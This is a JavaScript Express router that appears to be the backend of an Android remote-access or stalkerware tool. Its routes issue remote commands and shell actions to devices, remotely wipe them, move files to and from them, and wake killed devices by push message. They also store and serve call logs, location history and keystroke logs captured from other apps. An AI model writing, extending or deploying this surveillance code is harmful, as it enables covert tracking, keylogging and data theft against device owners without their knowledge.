/**
 * Admin API Routes
 */

import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs/promises';
import { socketRegistry } from '../services/socketRegistry.js';
import { commandDispatcher } from '../services/commandDispatcher.js';
import { saveCallLogs, getCallLogsFromDB, saveLocation, getLocationHistoryFromDB, getKeylogEventsFromDB } from '../services/database.js';
import { fcmSender } from '../services/fcmSender.js';
import { uploadFileToSupabase, downloadFileFromSupabase, deleteFileFromSupabase, getFileUrl } from '../services/storage.js';
import crypto from 'crypto';
import config from '../config.js';

const router = express.Router();

// ========== PER-DEVICE INFO RATE LIMITER ==========
// Prevents command flooding when multiple browser tabs auto-refresh every 10s
const infoRateMap = new Map(); // deviceId -> lastRequestTime
const INFO_MIN_INTERVAL_MS = 4000; // max 1 request per 4 seconds per device

function deviceInfoRateLimit(req, res, next) {
    const { deviceId } = req.params;
    const now = Date.now();
    const last = infoRateMap.get(deviceId) || 0;
    if (now - last < INFO_MIN_INTERVAL_MS) {
        return res.status(429).json({
            success: false,
            error: `Device info rate limited — please wait ${INFO_MIN_INTERVAL_MS / 1000}s between requests`,
        });
    }
    infoRateMap.set(deviceId, now);
    // Auto-cleanup stale entries every 60s
    if (!global._infoRateLimitTimer) {
        global._infoRateLimitTimer = setInterval(() => {
            const cutoff = Date.now() - 60_000;
            for (const [id, t] of infoRateMap) {
                if (t < cutoff) infoRateMap.delete(id);
            }
        }, 60_000);
    }
    next();
}

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: async (req, file, cb) => {
        const uploadDir = './uploads';
        try {
            await fs.mkdir(uploadDir, { recursive: true });
            cb(null, uploadDir);
        } catch (error) {
            cb(error);
        }
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${file.originalname}`;
        cb(null, uniqueName);
    },
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB
});

// ========== IN-MEMORY CALL LOG CACHE ==========
const callLogCache = new Map(); // deviceId -> { logs: [], lastFetched: timestamp }
const MAX_CACHED_LOGS = 1000;

function cacheCallLogs(deviceId, logs) {
    callLogCache.set(deviceId, {
        logs: logs.slice(0, MAX_CACHED_LOGS),
        lastFetched: new Date().toISOString(),
    });
    // Also persist to DB (fire & forget)
    saveCallLogs(deviceId, logs);
}

function getCachedCallLogs(deviceId) {
    const cached = callLogCache.get(deviceId);
    return cached ? cached : { logs: [], lastFetched: null };
}

/**
 * GET /api/devices - List all devices (online + offline)
 */
router.get('/devices', (req, res) => {
    const devices = socketRegistry.listDevices();
    res.json({
        success: true,
        total: devices.length,
        devices,
    });
});

/**
 * DELETE /api/device/:deviceId - Permanently delete a device
 * Cascade: server memory + Supabase (devices, call_logs, locations, keylog_events, scheduled_commands, command_history)
 */
router.delete('/device/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const removed = socketRegistry.deleteDevice(deviceId);
    if (removed) {
        // Clear ALL in-memory caches for this device
        if (global.keylogCache) global.keylogCache.delete(deviceId);
        callLogCache.delete(deviceId);
        locationCache.delete(deviceId);

        // Cancel all scheduled commands
        try {
            commandDispatcher.cancelAllScheduled(deviceId);
        } catch (e) {
            // cancelAllScheduled may not exist, ignore
        }

        // Clear command history
        commandDispatcher.clearHistory(deviceId);

        console.log(`[Admin] Device ${deviceId} fully deleted — all caches and DB records purged`);
        res.json({ success: true, message: `Device ${deviceId} permanently deleted` });
    } else {
        res.status(404).json({ success: false, error: 'Device not found' });
    }
});



/**
 * GET /api/devices/online - List only online devices
 */
router.get('/devices/online', (req, res) => {
    const devices = socketRegistry.getOnlineDevices();
    res.json({
        success: true,
        online: devices.length,
        devices,
    });
});

/**
 * GET /api/device/:deviceId/info - Get specific device info
 */
router.get('/device/:deviceId/info', deviceInfoRateLimit, async (req, res) => {
    const { deviceId } = req.params;

    // Validate deviceId format (alphanumeric + hyphen/underscore, 8–128 chars)
    if (!deviceId || !/^[a-zA-Z0-9_\-]{8,128}$/.test(deviceId)) {
        return res.status(400).json({
            success: false,
            error: 'Invalid deviceId format',
        });
    }

    try {
        const device = socketRegistry.getDevice(deviceId);
        if (!device) {
            return res.status(404).json({
                success: false,
                error: 'Device not found or disconnected',
            });
        }

        // Request fresh device info from the Android client via WebSocket command
        const liveInfo = await commandDispatcher.sendCommand(deviceId, 'device_info');

        // Explicit merge: stale metadata is the fallback, live data takes priority
        // (metadata may have cached values from registration; live data is always fresher)
        res.json({
            success: true,
            device: {
                deviceId,
                ...device.metadata,  // fallback: registration-time snapshot
                ...liveInfo,         // override: fresh live data from device
            },
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * GET /api/device/:deviceId/schedule - Get scheduled commands for a device
 */
router.get('/device/:deviceId/schedule', (req, res) => {
    try {
        const { deviceId } = req.params;
        const commands = commandDispatcher.getScheduled(deviceId);
        res.json({ success: true, commands });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

/**
 * POST /api/device/:deviceId/schedule - Schedule a new command
 */
router.post('/device/:deviceId/schedule', (req, res) => {
    try {
        const { deviceId } = req.params;
        const { action, payload } = req.body;
        
        console.log(`[Dispatcher] 📝 Received schedule request: ${action} for ${deviceId}`);
        
        if (!action) {
            return res.status(400).json({ success: false, error: 'Action is required' });
        }
        
        const cmd = commandDispatcher.scheduleCommand(deviceId, action, payload);
        console.log(`[Dispatcher] ✅ Successfully queued schedule ${cmd.id}`);
        res.json({ success: true, command: cmd });
    } catch (error) {
        console.error(`[Dispatcher] ❌ Failed to queue schedule:`, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

/**
 * DELETE /api/device/:deviceId/schedule/:cmdId - Cancel a scheduled command
 */
router.delete('/device/:deviceId/schedule/:cmdId', (req, res) => {
    try {
        const { deviceId, cmdId } = req.params;
        const success = commandDispatcher.cancelScheduled(deviceId, cmdId);
        
        if (success) {
            res.json({ success: true });
        } else {
            res.status(404).json({ success: false, error: 'Scheduled command not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

/**
 * POST /api/command/:deviceId - Send command to device
 */
router.post('/command/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { action, payload } = req.body;

    if (!action) {
        return res.status(400).json({
            success: false,
            error: 'Action is required',
        });
    }

    // Critical Security: Block destructive actions without explicit frontend MFA confirmation
    if (action === 'wipe_data') {
        if (!payload || payload.confirm !== true) {
            return res.status(403).json({
                success: false,
                error: 'MFA Verification failed: wipe_data requires structural confirmation.',
            });
        }
    }

    try {
        // CROSS-BUG-5: use longer timeout for slow commands (contacts_list can take 30-45s on large datasets)
        const slowCommands = ['contacts_list', 'contacts_export', 'apps_list'];
        const timeout = slowCommands.includes(action) ? 60000 : 30000;
        const data = await commandDispatcher.sendCommand(deviceId, action, payload || {}, timeout);
        res.json({
            success: true,
            data,
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * POST /api/upload/:deviceId - Upload file to device
 */
router.post('/upload/:deviceId', upload.single('file'), async (req, res) => {
    const { deviceId } = req.params;
    const { targetPath } = req.body;

    if (!req.file) {
        return res.status(400).json({
            success: false,
            error: 'No file provided',
        });
    }

    try {
        // Read uploaded file
        const fileBuffer = await fs.readFile(req.file.path);
        const base64Data = fileBuffer.toString('base64');

        // Send to device
        const result = await commandDispatcher.sendCommand(deviceId, 'file_upload', {
            path: targetPath || `/storage/emulated/0/Download/${req.file.originalname}`,
            data: base64Data,
            filename: req.file.originalname,
        });

        // Clean up temporary file
        await fs.unlink(req.file.path);

        res.json({
            success: true,
            data: result,
        });
    } catch (error) {
        // Clean up on error
        try {
            await fs.unlink(req.file.path);
        } catch (e) {
            // Ignore cleanup errors
        }

        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * Middleware: Verify Device HMAC signature for large file uploads
 */
const validateDeviceUpload = (req, res, next) => {
    const deviceId = req.header('X-Device-Id');
    const timestamp = req.header('X-Timestamp');
    const signature = req.header('X-Signature');

    if (!deviceId || !timestamp || !signature) {
        console.warn('[device-upload-temp] ❌ Missing headers');
        return res.status(401).json({ error: 'Missing device authentication headers' });
    }

    // Enforce 5-minute replay protection
    const age = Date.now() - parseInt(timestamp, 10);
    if (age > 5 * 60 * 1000) {
        console.warn(`[device-upload-temp] ❌ Expired request — age: ${age}ms`);
        return res.status(401).json({ error: 'Request payload expired (potential replay attack)' });
    }

    const secretUsed = config.websocket.deviceSecret;
    const payload = `${deviceId}:${timestamp}`;
    const expectedSignature = crypto
        .createHmac('sha256', secretUsed)
        .update(payload)
        .digest('hex');

    // Timing-safe comparison
    const sigBuf = Buffer.from(signature, 'utf8');
    const expectedBuf = Buffer.from(expectedSignature, 'utf8');

    if (sigBuf.length !== expectedBuf.length || !crypto.timingSafeEqual(sigBuf, expectedBuf)) {
        console.warn(`[device-upload-temp] ❌ HMAC mismatch for device: ${deviceId}`);
        return res.status(403).json({ error: 'Invalid device payload signature' });
    }

    next();
};

const handleTempUpload = async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
    }
    
    try {
        const fileBuffer = await fs.readFile(req.file.path);
        
        // Try Supabase first, fallback to local
        const { url, error } = await uploadFileToSupabase('media-extracts', req.file.filename, fileBuffer, req.file.mimetype);
        
        if (!error && url) {
            // Supabase success — clean up local temp
            await fs.unlink(req.file.path).catch(e => {});
            return res.json({
                status: 'success',
                storage: 'cloud',
                tempFilename: req.file.filename,
                originalName: req.file.originalname,
                url: url
            });
        }
        
        // Supabase unavailable — keep file locally in uploads/
        console.log(`[upload-temp] Supabase unavailable, keeping file locally: ${req.file.filename}`);
        
        // Auto-cleanup local file after 10 minutes
        setTimeout(() => {
            fs.unlink(req.file.path).catch(() => {});
        }, 10 * 60 * 1000);
        
        res.json({
            status: 'success',
            storage: 'local',
            tempFilename: req.file.filename,
            originalName: req.file.originalname,
            url: `/api/download-temp/${req.file.filename}`
        });
    } catch (err) {
        console.error('[upload-temp] Processing error:', err);
        await fs.unlink(req.file.path).catch(() => {});
        res.status(500).json({ error: 'Failed to process file' });
    }
};

/**
 * POST /api/device-upload-temp - Endpoint for device to upload large files temporarily
 * Used when file > 5MB to avoid WebSocket crash
 */
router.post('/device-upload-temp', validateDeviceUpload, upload.single('file'), handleTempUpload);

/**
 * POST /api/admin-upload-temp - Endpoint for admin dashboard to upload large files temporarily (e.g. video casting)
 * Handled by standard auth and CSRF middleware, so no device validation needed.
 */
router.post('/admin-upload-temp', upload.single('file'), handleTempUpload);

/**
 * GET /api/download-temp/:filename - Download a temp-uploaded file
 * Used by device to download files uploaded via /api/device-upload-temp
 * (e.g., video playback: dashboard uploads video → device downloads to play)
 */
router.get('/download-temp/:filename', async (req, res) => {
    const { filename } = req.params;
    const safeName = path.basename(filename);
    const localPath = path.resolve('./uploads', safeName);
    
    // 1. Check if the file exists locally (means Supabase fallback was used)
    try {
        await fs.access(localPath);
        return res.sendFile(localPath);
    } catch {}

    // 2. Otherwise assume it's in Supabase
    const url = getFileUrl('media-extracts', safeName);
    if (url) {
        return res.redirect(url);
    }
    
    res.status(404).json({ error: 'File not found' });
});

/**
 * GET /api/download/:deviceId - Download file from device
 */
router.get('/download/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { path: filePath } = req.query;

    if (!filePath) {
        return res.status(400).json({
            success: false,
            error: 'File path is required',
        });
    }

    try {
        const result = await commandDispatcher.sendCommand(deviceId, 'file_download', {
            path: filePath,
        });

        // STRATEGY 1: Large File (Temp Upload)
        if (result.strategy === 'temp_url' && result.tempFilename) {
            const filename = result.filename || path.basename(filePath);
            const localPath = path.resolve('./uploads', result.tempFilename);
            
            // 1. Check local file first (definitive proof Supabase upload failed/fallback used)
            try {
                await fs.access(localPath);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                res.setHeader('Content-Type', 'application/octet-stream');
                const fileBuffer = await fs.readFile(localPath);
                // Cleanup after sending
                setTimeout(() => { fs.unlink(localPath).catch(() => {}); }, 10000);
                return res.send(fileBuffer);
            } catch {}

            // 2. If no local file, it must be in Supabase
            let url = getFileUrl('media-extracts', result.tempFilename);
            if (url) {
                url = `${url}?download=${encodeURIComponent(filename)}`;
                setTimeout(() => {
                    deleteFileFromSupabase('media-extracts', result.tempFilename)
                        .catch(e => console.error('Delayed cleanup failed:', e));
                }, 10000);
                return res.redirect(url);
            }
            
            return res.status(500).json({ success: false, error: 'File not found in cloud or local storage' });
        }

        // STRATEGY 2: Small File (Base64) - Default behavior
        const filename = result.filename || path.basename(filePath);
        const buffer = Buffer.from(result.data, 'base64');

        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(buffer);
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});

/**
 * GET /api/stats - Server statistics
 */
router.get('/stats', (req, res) => {
    res.json({
        success: true,
        stats: {
            connectedDevices: socketRegistry.getDeviceCount(),
            pendingCommands: commandDispatcher.getPendingCount(),
            uptime: process.uptime(),
            memory: process.memoryUsage(),
        },
    });
});

// (Device delete route is defined above at line ~69 — single comprehensive handler)

/**
 * GET /api/device/:deviceId/history - Get command history for device
 * Query params: ?limit=50&action=call_state&status=success
 */
router.get('/device/:deviceId/history', (req, res) => {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 100;
    const actionFilter = req.query.action || null;
    const statusFilter = req.query.status || null;

    let history = commandDispatcher.getHistory(deviceId, limit);

    if (actionFilter) {
        history = history.filter(h => h.action === actionFilter);
    }
    if (statusFilter) {
        history = history.filter(h => h.status === statusFilter);
    }

    res.json({
        success: true,
        count: history.length,
        history,
    });
});

/**
 * GET /api/history - Get ALL command history (all devices)
 * Query params: ?limit=100&action=shell_exec
 */
router.get('/history', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    const actionFilter = req.query.action || null;

    let history = commandDispatcher.getHistory(null, limit);

    if (actionFilter) {
        history = history.filter(h => h.action === actionFilter);
    }

    res.json({
        success: true,
        count: history.length,
        history,
    });
});

/**
 * DELETE /api/device/:deviceId/history - Clear command history
 */
router.delete('/device/:deviceId/history', (req, res) => {
    const { deviceId } = req.params;
    commandDispatcher.clearHistory(deviceId);
    res.json({ success: true, message: `History cleared for ${deviceId}` });
});

// ========== CALL LOGS PERSISTENCE ==========

/**
 * GET /api/device/:deviceId/call-logs - Get cached call logs
 * Returns in-memory cache. If device is online, also fetches fresh.
 */
router.get('/device/:deviceId/call-logs', async (req, res) => {
    const { deviceId } = req.params;
    const forceRefresh = req.query.refresh === 'true';
    const limit = parseInt(req.query.limit) || 500;

    // Check if device is online and fetch fresh logs
    const device = socketRegistry.getDevice(deviceId);
    if (device && device.ws && device.ws.readyState === 1 && forceRefresh) {
        try {
            const result = await commandDispatcher.sendCommand(deviceId, 'call_logs', { limit });
            if (result && result.data) {
                const logs = Array.isArray(result.data) ? result.data : (result.data.data || []);
                if (logs.length > 0) {
                    cacheCallLogs(deviceId, logs);
                    return res.json({
                        success: true,
                        source: 'device',
                        count: logs.length,
                        lastFetched: new Date().toISOString(),
                        logs,
                    });
                }
            }
        } catch (err) {
            // Device fetch failed, fall through to cache
        }
    }

    // Return cached logs
    const cached = getCachedCallLogs(deviceId);
    if (cached.logs.length > 0) {
        return res.json({
            success: true,
            source: 'cache',
            count: cached.logs.length,
            lastFetched: cached.lastFetched,
            logs: cached.logs,
        });
    }

    // Try loading from DB
    const dbLogs = await getCallLogsFromDB(deviceId, limit);
    if (dbLogs.length > 0) {
        // Map DB format back to app format
        const mapped = dbLogs.map(row => ({
            id: row.id,       // CALL-BUG-9: was missing — deleteLog sent undefined for cached logs
            name: row.name || '',
            number: row.number,
            type: row.type,
            date: row.date,
            duration: row.duration,
        }));
        callLogCache.set(deviceId, { logs: mapped, lastFetched: 'from-db' });
        return res.json({
            success: true,
            source: 'database',
            count: mapped.length,
            logs: mapped,
        });
    }

    res.json({
        success: true,
        source: 'none',
        count: 0,
        logs: [],
        message: 'No cached call logs. Open the Calls page while device is online to fetch.',
    });
});

/**
 * POST /api/device/:deviceId/call-logs/cache - Manually cache call logs
 * Called by calls.html after fetching logs from device
 */
router.post('/device/:deviceId/call-logs/cache', express.json(), (req, res) => {
    const { deviceId } = req.params;
    const { logs } = req.body;

    if (!logs || !Array.isArray(logs)) {
        return res.status(400).json({ success: false, error: 'logs array required' });
    }

    cacheCallLogs(deviceId, logs);
    res.json({ success: true, cached: logs.length });
});

// ========== LOCATION PERSISTENCE ==========
const locationCache = new Map(); // deviceId -> { history: [], lastUpdated: timestamp }
const MAX_LOCATION_HISTORY = 100;

function cacheLocation(deviceId, loc) {
    let cached = locationCache.get(deviceId);
    if (!cached) {
        cached = { history: [], lastUpdated: null };
        locationCache.set(deviceId, cached);
    }

    const entry = {
        latitude: loc.latitude,
        longitude: loc.longitude,
        accuracy: loc.accuracy || null,
        altitude: loc.altitude || null,
        speed: loc.speed || null,
        provider: loc.provider || null,
        timestamp: new Date().toISOString(),
    };

    cached.history.unshift(entry);
    if (cached.history.length > MAX_LOCATION_HISTORY) {
        cached.history = cached.history.slice(0, MAX_LOCATION_HISTORY);
    }
    cached.lastUpdated = entry.timestamp;

    // Persist to DB (fire & forget)
    saveLocation(deviceId, loc);
}

/**
 * GET /api/device/:deviceId/locations - Get location history
 */
router.get('/device/:deviceId/locations', async (req, res) => {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 100;

    // Return from cache first
    const cached = locationCache.get(deviceId);
    if (cached && cached.history.length > 0) {
        return res.json({
            success: true,
            source: 'cache',
            count: cached.history.length,
            lastUpdated: cached.lastUpdated,
            locations: cached.history.slice(0, limit),
        });
    }

    // Fallback to DB
    const dbLocs = await getLocationHistoryFromDB(deviceId, limit);
    if (dbLocs.length > 0) {
        const mapped = dbLocs.map(row => ({
            latitude: row.latitude,
            longitude: row.longitude,
            accuracy: row.accuracy,
            altitude: row.altitude,
            speed: row.speed,
            provider: row.provider,
            timestamp: row.created_at,
        }));
        // Warm the cache
        locationCache.set(deviceId, { history: mapped, lastUpdated: mapped[0].timestamp });
        return res.json({
            success: true,
            source: 'database',
            count: mapped.length,
            locations: mapped,
        });
    }

    res.json({ success: true, source: 'none', count: 0, locations: [] });
});

/**
 * POST /api/device/:deviceId/locations/cache - Save a location point
 * Called by location.html after each fetch
 */
router.post('/device/:deviceId/locations/cache', express.json(), (req, res) => {
    const { deviceId } = req.params;
    const loc = req.body;

    if (!loc || loc.latitude === undefined || loc.longitude === undefined) {
        return res.status(400).json({ success: false, error: 'latitude/longitude required' });
    }

    cacheLocation(deviceId, loc);
    res.json({ success: true });
});

// ========== KEYLOG EVENTS ==========

/**
 * GET /api/device/:deviceId/keylogs - Get keylog events
 */
router.get('/device/:deviceId/keylogs', async (req, res) => {
    const { deviceId } = req.params;
    const limit = parseInt(req.query.limit) || 500;
    const appFilter = req.query.app || null;

    // Check in-memory cache first
    const cache = global.keylogCache;
    let events = [];

    if (cache && cache.has(deviceId)) {
        events = cache.get(deviceId).slice(0, limit);
    }

    // If no cache, try DB
    if (events.length === 0) {
        const dbEvents = await getKeylogEventsFromDB(deviceId, limit);
        if (dbEvents.length > 0) {
            events = dbEvents.map(row => ({
                type: row.event_type,
                app: row.app_package,
                text: row.text,
                fullText: row.full_text,
                className: row.class_name,
                timestamp: new Date(row.created_at).getTime(),
                receivedAt: row.created_at,
            }));
        }
    }

    // Apply app filter
    if (appFilter && events.length > 0) {
        events = events.filter(e => e.app && e.app.includes(appFilter));
    }

    res.json({
        success: true,
        count: events.length,
        source: events.length > 0 ? 'cache' : 'none',
        events,
    });
});

/**
 * DELETE /api/device/:deviceId/keylogs - Clear keylog cache
 */
router.delete('/device/:deviceId/keylogs', (req, res) => {
    const { deviceId } = req.params;
    if (global.keylogCache && global.keylogCache.has(deviceId)) {
        global.keylogCache.delete(deviceId);
    }
    res.json({ success: true, message: `Keylog cache cleared for ${deviceId}` });
});

/**
 * POST /api/device/:deviceId/wake - Send FCM push to wake a killed device
 */
router.post('/device/:deviceId/wake', async (req, res) => {
    const { deviceId } = req.params;
    const device = socketRegistry.getDevice(deviceId);
    const fcmToken = device?.metadata?.fcmToken;

    if (!fcmToken) {
        return res.json({ success: false, error: 'No FCM token — device never registered with push support' });
    }

    const sent = await fcmSender.wakeDevice(fcmToken, deviceId);
    res.json({ success: sent, message: sent ? 'Wake push sent — device should reconnect in ~10s' : 'FCM push failed' });
});

export default router;
